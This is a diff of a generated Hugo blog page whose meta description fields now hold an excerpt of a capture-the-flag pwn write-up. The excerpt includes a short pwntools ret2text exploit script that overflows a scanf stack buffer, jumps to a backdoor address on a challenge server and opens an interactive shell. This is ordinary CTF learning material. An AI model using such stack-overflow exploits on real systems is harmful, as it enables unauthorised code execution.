@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" ">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Pwn ezzzzz_overflow 开了NX保护，scanf函数存在无限栈溢出，有后门，ret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(&#39;./pwn&#39;) p=remote(&#39;192.168.248.1&#39;,64762) context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;) p.recvuntil(b&#39;you name?&#39;) shell=0x4011b6 ret=0x4012AA pay=b&#39;a&#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop 有NX和pie\n">
 <title></title>
 
 <link rel='canonical' href='http://localhost:1313/p/'>
 
 <link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="">
-<meta property='og:description' content=" ">
+<meta property='og:description' content="Pwn ezzzzz_overflow 开了NX保护，scanf函数存在无限栈溢出，有后门，ret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(&#39;./pwn&#39;) p=remote(&#39;192.168.248.1&#39;,64762) context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;) p.recvuntil(b&#39;you name?&#39;) shell=0x4011b6 ret=0x4012AA pay=b&#39;a&#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop 有NX和pie\n">
 <meta property='og:url' content='http://localhost:1313/p/'>
 <meta property='og:site_name' content='扶光的故事集'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' />
 <meta name="twitter:title" content="">
-<meta name="twitter:description" content=" ">
+<meta name="twitter:description" content="Pwn ezzzzz_overflow 开了NX保护，scanf函数存在无限栈溢出，有后门，ret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(&#39;./pwn&#39;) p=remote(&#39;192.168.248.1&#39;,64762) context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;) p.recvuntil(b&#39;you name?&#39;) shell=0x4011b6 ret=0x4012AA pay=b&#39;a&#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop 有NX和pie\n">
     </head>
     <body class="
     article-page
@@ -1285,7 +1285,7 @@
 <style>
   body {
      
-    background: url("http://localhost:1313/background/Ai.jpg") no-repeat center top;
+    background: url("http://localhost:1313/background/Ai2.jpg") no-repeat center top;
     background-size: cover;
     background-attachment: fixed;
      
